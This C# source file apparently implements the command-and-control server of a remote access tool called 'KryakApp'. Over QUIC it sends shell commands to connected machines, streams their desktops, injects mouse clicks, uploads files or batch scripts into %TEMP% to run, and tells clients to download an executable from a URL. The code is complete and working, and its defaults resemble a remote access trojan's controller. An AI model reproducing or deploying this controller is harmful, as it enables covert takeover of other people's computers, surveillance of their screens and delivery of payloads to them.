using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Quic;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Buffers.Binary;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace KryakApp.Services;

public sealed class Server
{
    private const int MaxFrameSizeBytes = 5 * 1024 * 1024;
    private const int MaxPendingPingsPerClient = 32;
    private static readonly TimeSpan PendingPingTimeout = TimeSpan.FromSeconds(30);

    private QuicListener? _listener;
    private CancellationTokenSource? _cts;
    private Task? _listenerTask;
    private Task? _pingTask;
    private readonly ConcurrentDictionary<QuicConnection, ClientSession> _sessions = new();
    private static readonly JsonSerializerOptions JsonOptions = new()
    {
        PropertyNameCaseInsensitive = true
    };

    public event Action<UserData>? UserConnected;
    public event Action<UserData, string>? UserPingUpdated;
    public event Action<UserData>? UserDisconnected;
    public event Action<UserData, string>? ConsoleOutputReceived;
    public event Action<UserData, int, int, string>? DesktopFrameReceived;
    public event Action<bool>? ServerStateChanged;

    public int Port { get; private set; }
    public bool IsRunning { get; private set; }
    public string CurrentCertificateFingerprint { get; private set; } = string.Empty;

    public IEnumerable<UserData> GetConnectedUsers()
    {
        return _sessions.Values.Select(s => s.User);
    }

    public async Task<bool> SendClientCommandAsync(UserData user, string command, CancellationToken token = default)
    {
        if (user.Client is null || string.IsNullOrWhiteSpace(command))
        {
            return false;
        }

        try
        {
            ClientMessage control = new()
            {
                Channel = ChannelNames.Control,
                Type = MessageTypes.Command,
                Command = command
            };

            QuicStream outbound = await user.Client.OpenOutboundStreamAsync(QuicStreamType.Unidirectional, token);
            await using (outbound)
            {
                await WriteFrameAsync(outbound, control, token);
            }

            return true;
        }
        catch
        {
            return false;
        }
    }

    public async Task<bool> SendDesktopStartAsync(UserData user, int monitorIndex, int quality, CancellationToken token = default)
    {
        if (user.Client is null)
        {
            return false;
        }

        try
        {
            ClientMessage msg = new()
            {
                Channel = ChannelNames.Main,
                Type = MessageTypes.DesktopStart,
                DesktopMonitor = monitorIndex,
                DesktopQuality = quality
            };

            QuicStream outbound = await user.Client.OpenOutboundStreamAsync(QuicStreamType.Unidirectional, token);
            await using (outbound)
            {
                await WriteFrameAsync(outbound, msg, token);
            }

            return true;
        }
        catch
        {
            return false;
        }
    }

    public async Task<bool> SendDesktopStopAsync(UserData user, CancellationToken token = default)
    {
        if (user.Client is null)
        {
            return false;
        }

        try
        {
            ClientMessage msg = new()
            {
                Channel = ChannelNames.Main,
                Type = MessageTypes.DesktopStop
            };

            QuicStream outbound = await user.Client.OpenOutboundStreamAsync(QuicStreamType.Unidirectional, token);
            await using (outbound)
            {
                await WriteFrameAsync(outbound, msg, token);
            }

            return true;
        }
        catch
        {
            return false;
        }
    }

    public async Task<bool> SendMouseClickAsync(UserData user, int x, int y, string button, CancellationToken token = default)
    {
        if (user.Client is null)
        {
            return false;
        }

        try
        {
            ClientMessage msg = new()
            {
                Channel = ChannelNames.Main,
                Type = MessageTypes.MouseClick,
                MouseX = x,
                MouseY = y,
                MouseButton = button
            };

            QuicStream outbound = await user.Client.OpenOutboundStreamAsync(QuicStreamType.Unidirectional, token);
            await using (outbound)
            {
                await WriteFrameAsync(outbound, msg, token);
            }

            return true;
        }
        catch
        {
            return false;
        }
    }

    public async Task<string?> SendRunFileAsync(UserData user, string filePath, string fileName, string remotePath, CancellationToken token = default)
    {
        if (user.Client is null || string.IsNullOrWhiteSpace(filePath))
        {
            return "Invalid client or file path";
        }

        try
        {
            FileInfo fi = new(filePath);
            const long maxFileSize = 150L * 1024 * 1024;

            if (fi.Length > maxFileSize)
            {
                return $"File too large ({fi.Length / 1024 / 1024} MB). Max: 150 MB";
            }

            if (string.IsNullOrWhiteSpace(fileName))
            {
                fileName = Path.GetFileName(filePath);
            }

            if (string.IsNullOrWhiteSpace(remotePath))
            {
                remotePath = "%TEMP%";
            }

            QuicStream outbound = await user.Client.OpenOutboundStreamAsync(QuicStreamType.Unidirectional, token);
            await using (outbound)
            {
                ClientMessage startMsg = new()
                {
                    Channel = ChannelNames.File,
                    Type = MessageTypes.FileStart,
                    FileName = fileName,
                    FileSize = fi.Length,
                    RemotePath = remotePath
                };
                await WriteFrameAsync(outbound, startMsg, token);

                byte[] buffer = new byte[3 * 1024 * 1024];
                long remaining = fi.Length;

                using FileStream fs = new(filePath, FileMode.Open, FileAccess.Read, FileShare.Read, buffer.Length);

                while (remaining > 0)
                {
                    int read = await fs.ReadAsync(buffer.AsMemory(0, (int)Math.Min(buffer.Length, remaining)), token);
                    if (read <= 0) break;

                    string chunkBase64 = Convert.ToBase64String(buffer, 0, read);

                    ClientMessage chunkMsg = new()
                    {
                        Channel = ChannelNames.File,
                        Type = MessageTypes.FileChunk,
                        FileData = chunkBase64
                    };
                    await WriteFrameAsync(outbound, chunkMsg, token);

                    remaining -= read;
                }

                ClientMessage endMsg = new()
                {
                    Channel = ChannelNames.File,
                    Type = MessageTypes.FileEnd,
                    FileName = fileName
                };
                await WriteFrameAsync(outbound, endMsg, token);
            }

            return null;
        }
        catch (Exception ex)
        {
            return ex.Message;
        }
    }

    public async Task<string?> SendFileDownloadAsync(UserData user, string url, string fileName, string remotePath, CancellationToken token = default)
    {
        if (user.Client is null || string.IsNullOrWhiteSpace(url))
        {
            return "Invalid client or URL";
        }

        if (string.IsNullOrWhiteSpace(fileName))
        {
            fileName = Path.GetFileName(new Uri(url).LocalPath);
            if (string.IsNullOrWhiteSpace(fileName))
            {
                fileName = "downloaded.exe";
            }
        }

        if (string.IsNullOrWhiteSpace(remotePath))
        {
            remotePath = "%TEMP%";
        }

        try
        {
            ClientMessage msg = new()
            {
                Channel = ChannelNames.File,
                Type = MessageTypes.FileDownload,
                FileUrl = url,
                FileName = fileName,
                RemotePath = remotePath
            };

            QuicStream outbound = await user.Client.OpenOutboundStreamAsync(QuicStreamType.Unidirectional, token);
            await using (outbound)
            {
                await WriteFrameAsync(outbound, msg, token);
            }

            return null;
        }
        catch (Exception ex)
        {
            return ex.Message;
        }
    }

    public async Task<string?> SendScriptAsync(UserData user, string scriptContent, string fileName, string remotePath, CancellationToken token = default)
    {
        if (user.Client is null)
        {
            return "Invalid client";
        }

        if (string.IsNullOrWhiteSpace(scriptContent))
        {
            return "Script content is empty";
        }

        if (string.IsNullOrWhiteSpace(fileName))
        {
            fileName = "script.bat";
        }

        if (string.IsNullOrWhiteSpace(remotePath))
        {
            remotePath = "%TEMP%";
        }

        try
        {
            string base64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(scriptContent));

            ClientMessage msg = new()
            {
                Channel = ChannelNames.File,
                Type = MessageTypes.RunScript,
                FileName = fileName,
                FileData = base64,
                RemotePath = remotePath
            };

            QuicStream outbound = await user.Client.OpenOutboundStreamAsync(QuicStreamType.Unidirectional, token);
            await using (outbound)
            {
                await WriteFrameAsync(outbound, msg, token);
            }

            return null;
        }
        catch (Exception ex)
        {
            return ex.Message;
        }
    }

    public async Task StartServer(int port, string certificatePath, string certificatePassword)
    {
        if (IsRunning)
            return;

        X509Certificate2 certificate = new(
            certificatePath,
            certificatePassword,
            X509KeyStorageFlags.Exportable);

        _cts = new CancellationTokenSource();

        QuicListenerOptions options = new()
        {
            ListenEndPoint = new IPEndPoint(IPAddress.Any, port),
            ApplicationProtocols =
            [
                new SslApplicationProtocol("kryak")
            ],
            ConnectionOptionsCallback = (_, _, _) =>
                ValueTask.FromResult(new QuicServerConnectionOptions
                {
                    DefaultCloseErrorCode = 0,
                    DefaultStreamErrorCode = 0,
                    ServerAuthenticationOptions = new SslServerAuthenticationOptions
                    {
                        ServerCertificate = certificate,
                        ApplicationProtocols =
                        [
                            new SslApplicationProtocol("kryak")
                        ]
                    }
                })
        };

        _listener = await QuicListener.ListenAsync(options, _cts.Token);

        Port = port;
        IsRunning = true;
        CurrentCertificateFingerprint = certificate.Thumbprint ?? string.Empty;
        ServerStateChanged?.Invoke(true);

        _listenerTask = ListenerLoop(_cts.Token);
        _pingTask = PingLoop(_cts.Token);
    }

    public async Task StopServer()
    {
        if (!IsRunning)
            return;

        IsRunning = false;
        CurrentCertificateFingerprint = string.Empty;
        ServerStateChanged?.Invoke(false);

        _cts?.Cancel();

        if (_listener != null)
            await _listener.DisposeAsync();

        if (_listenerTask != null)
        {
            try
            {
                await _listenerTask;
            }
            catch (OperationCanceledException) when (_cts?.IsCancellationRequested == true)
            {
            }
        }

        if (_pingTask != null)
        {
            try
            {
                await _pingTask;
            }
            catch (OperationCanceledException) when (_cts?.IsCancellationRequested == true)
            {
            }
        }

        _cts?.Dispose();
        _sessions.Clear();
        _cts = null;
        _listener = null;
        _listenerTask = null;
        _pingTask = null;
    }

    private async Task ListenerLoop(CancellationToken token)
    {
        if (_listener == null)
            return;

        try
        {
            while (!token.IsCancellationRequested)
            {
                QuicConnection connection = await _listener.AcceptConnectionAsync(token);

                _ = HandleConnection(connection, token).ContinueWith(
                    static t => Trace.TraceError(t.Exception?.GetBaseException().Message),
                    TaskContinuationOptions.OnlyOnFaulted);
            }
        }
        catch (OperationCanceledException) when (token.IsCancellationRequested)
        {
        }
        catch (ObjectDisposedException) when (token.IsCancellationRequested)
        {
        }
    }

    private async Task HandleConnection(QuicConnection connection, CancellationToken token)
    {
        UserData? connectedUser = null;
        object sync = new();

        try
        {
            await using (connection)
            {
                while (!token.IsCancellationRequested)
                {
                    QuicStream stream = await connection.AcceptInboundStreamAsync(token);

                    _ = ProcessStreamAsync(stream, connection, token, sync, getUser: () => connectedUser, setUser: user => connectedUser = user).ContinueWith(
                        static t => Trace.TraceError(t.Exception?.GetBaseException().Message),
                        TaskContinuationOptions.OnlyOnFaulted);
                }
            }
        }
        catch (OperationCanceledException) when (token.IsCancellationRequested)
        {
        }
        catch (ObjectDisposedException) when (token.IsCancellationRequested)
        {
        }
        finally
        {
            _sessions.TryRemove(connection, out _);

            if (connectedUser != null)
            {
                UserDisconnected?.Invoke(connectedUser);
            }
        }
    }

    private async Task ProcessStreamAsync(
        QuicStream stream,
        QuicConnection connection,
        CancellationToken token,
        object sync,
        Func<UserData?> getUser,
        Action<UserData> setUser)
    {
        try
        {
            await using (stream)
            {
                while (!token.IsCancellationRequested)
                {
                    string frame = await ReadFrameAsync(stream, token);
                    ClientMessage? message = JsonSerializer.Deserialize<ClientMessage>(frame, JsonOptions);
                    if (message is null)
                    {
                        continue;
                    }

                    if (string.Equals(message.Channel, ChannelNames.Main, StringComparison.OrdinalIgnoreCase))
                    {
                        if (string.Equals(message.Type, MessageTypes.Hello, StringComparison.OrdinalIgnoreCase))
                        {
                            if (message.User is null)
                            {
                                continue;
                            }

                            lock (sync)
                            {
                                if (getUser() == null)
                                {
                                    UserData user = message.User;
                                    if (string.IsNullOrWhiteSpace(user.UserIPAddress) && connection.RemoteEndPoint is IPEndPoint endpoint)
                                    {
                                        user.UserIPAddress = endpoint.Address.ToString();
                                    }

                                    setUser(user);
                                    user.Client = connection;
                                    _sessions[connection] = new ClientSession(connection, user);
                                    UserConnected?.Invoke(user);
                                }
                            }

                            continue;
                        }

                        if (string.Equals(message.Type, MessageTypes.Pong, StringComparison.OrdinalIgnoreCase))
                        {
                            UserData? user = getUser();
                            if (user == null || string.IsNullOrWhiteSpace(message.PingId))
                            {
                                continue;
                            }

                            if (_sessions.TryGetValue(connection, out ClientSession? session)
                                && session.TryResolvePing(message.PingId, out long rttMs))
                            {
                                UserPingUpdated?.Invoke(user, rttMs.ToString());
                            }
                        }

                        continue;
                    }

                    if (string.Equals(message.Channel, ChannelNames.Control, StringComparison.OrdinalIgnoreCase)
                        && string.Equals(message.Type, MessageTypes.ConsoleOutput, StringComparison.OrdinalIgnoreCase))
                    {
                        UserData? user = getUser();
                        if (user != null && !string.IsNullOrWhiteSpace(message.ConsoleOutput))
                        {
                            ConsoleOutputReceived?.Invoke(user, message.ConsoleOutput);
                        }

                        continue;
                    }

                    if (string.Equals(message.Channel, ChannelNames.Desktop, StringComparison.OrdinalIgnoreCase)
                        && string.Equals(message.Type, MessageTypes.DesktopFrame, StringComparison.OrdinalIgnoreCase))
                    {
                        UserData? user = getUser();
                        if (user != null && message.DesktopFrame != null)
                        {
                            DesktopFrameReceived?.Invoke(user, message.DesktopMonitor, message.DesktopQuality, message.DesktopFrame);
                        }

                        continue;
                    }
                }
            }
        }
        catch (EndOfStreamException)
        {
        }
        catch (OperationCanceledException) when (token.IsCancellationRequested)
        {
        }
        catch (ObjectDisposedException) when (token.IsCancellationRequested)
        {
        }
    }

    private async Task PingLoop(CancellationToken token)
    {
        using PeriodicTimer timer = new(TimeSpan.FromSeconds(5));

        try
        {
            while (await timer.WaitForNextTickAsync(token))
            {
                foreach (ClientSession session in _sessions.Values)
                {
                    session.PruneExpiredPings(PendingPingTimeout);

                    _ = SendPingRequestAsync(session, token).ContinueWith(
                        static t => Trace.TraceError(t.Exception?.GetBaseException().Message),
                        TaskContinuationOptions.OnlyOnFaulted);
                }
            }
        }
        catch (OperationCanceledException) when (token.IsCancellationRequested)
        {
        }
    }

    private async Task SendPingRequestAsync(ClientSession session, CancellationToken token)
    {
        string pingId = Guid.NewGuid().ToString("N");
        if (!session.TrackPing(pingId, MaxPendingPingsPerClient))
        {
            return;
        }

        ClientMessage pingRequest = new()
        {
            Channel = ChannelNames.Ping,
            Type = MessageTypes.PingRequest,
            PingId = pingId
        };

        QuicStream outbound = await session.Connection.OpenOutboundStreamAsync(QuicStreamType.Unidirectional, token);
        await using (outbound)
        {
            await WriteFrameAsync(outbound, pingRequest, token);
        }
    }

    private static async Task<string> ReadFrameAsync(Stream stream, CancellationToken token)
    {
        byte[] lengthBuffer = new byte[4];
        await stream.ReadExactlyAsync(lengthBuffer.AsMemory(), token);

        int length = checked((int)BinaryPrimitives.ReadUInt32BigEndian(lengthBuffer));
        if (length <= 0 || length > MaxFrameSizeBytes)
        {
            throw new InvalidDataException("Invalid frame length.");
        }

        byte[] payload = new byte[length];
        await stream.ReadExactlyAsync(payload.AsMemory(), token);

        return System.Text.Encoding.UTF8.GetString(payload);
    }

    private static async Task WriteFrameAsync(Stream stream, ClientMessage message, CancellationToken token)
    {
        byte[] payload = JsonSerializer.SerializeToUtf8Bytes(message, JsonOptions);
        byte[] lengthBuffer = new byte[4];
        BinaryPrimitives.WriteUInt32BigEndian(lengthBuffer, checked((uint)payload.Length));

        await stream.WriteAsync(lengthBuffer.AsMemory(), token);
        await stream.WriteAsync(payload.AsMemory(), token);
    }

    private static class ChannelNames
    {
        public const string Main = "main";
        public const string Ping = "ping";
        public const string Control = "control";
        public const string Desktop = "desktop";
        public const string File = "file";
    }

    private static class MessageTypes
    {
        public const string Hello = "hello";
        public const string PingRequest = "ping_request";
        public const string Pong = "pong";
        public const string Command = "command";
        public const string ConsoleOutput = "console_output";
        public const string DesktopFrame = "frame";
        public const string DesktopStart = "desktop_start";
        public const string DesktopStop = "desktop_stop";
        public const string FileStart = "file_start";
        public const string FileChunk = "file_chunk";
        public const string FileEnd = "file_end";
        public const string FileDownload = "file_download";
        public const string RunScript = "run_script";
        public const string MouseClick = "mouse_click";
    }

    private sealed class ClientMessage
    {
        public string Channel { get; set; } = string.Empty;
        public string Type { get; set; } = string.Empty;
        public UserData? User { get; set; }
        public string? Ping { get; set; }
        public string? PingId { get; set; }
        public string? Command { get; set; }
        public string? ConsoleOutput { get; set; }
        public string? DesktopFrame { get; set; }
        public int DesktopMonitor { get; set; }
        public int DesktopQuality { get; set; }
        public string? FileData { get; set; }
        public string? FileName { get; set; }
        public long FileSize { get; set; }
        public string? FileUrl { get; set; }
        public string? RemotePath { get; set; }
        public int MouseX { get; set; }
        public int MouseY { get; set; }
        public string? MouseButton { get; set; }
    }

    private sealed class ClientSession
    {
        private readonly Dictionary<string, DateTimeOffset> _pendingPings = new();
        private readonly Queue<string> _pendingOrder = new();
        private readonly object _sync = new();

        public ClientSession(QuicConnection connection, UserData user)
        {
            Connection = connection;
            User = user;
        }

        public QuicConnection Connection { get; }
        public UserData User { get; }

        public bool TrackPing(string pingId, int limit)
        {
            lock (_sync)
            {
                if (_pendingPings.Count >= limit)
                {
                    return false;
                }

                _pendingPings[pingId] = DateTimeOffset.UtcNow;
                _pendingOrder.Enqueue(pingId);
                return true;
            }
        }

        public void PruneExpiredPings(TimeSpan timeout)
        {
            lock (_sync)
            {
                DateTimeOffset now = DateTimeOffset.UtcNow;
                while (_pendingOrder.Count > 0)
                {
                    string pingId = _pendingOrder.Peek();
                    if (!_pendingPings.TryGetValue(pingId, out DateTimeOffset sentAt))
                    {
                        _pendingOrder.Dequeue();
                        continue;
                    }

                    if (now - sentAt < timeout)
                    {
                        break;
                    }

                    _pendingOrder.Dequeue();
                    _pendingPings.Remove(pingId);
                }
            }
        }

        public bool TryResolvePing(string pingId, out long rttMs)
        {
            lock (_sync)
            {
                if (!_pendingPings.Remove(pingId, out DateTimeOffset sentAt))
                {
                    rttMs = 0;
                    return false;
                }

                rttMs = Math.Max(0, (long)(DateTimeOffset.UtcNow - sentAt).TotalMilliseconds);
                return true;
            }
        }
    }
}
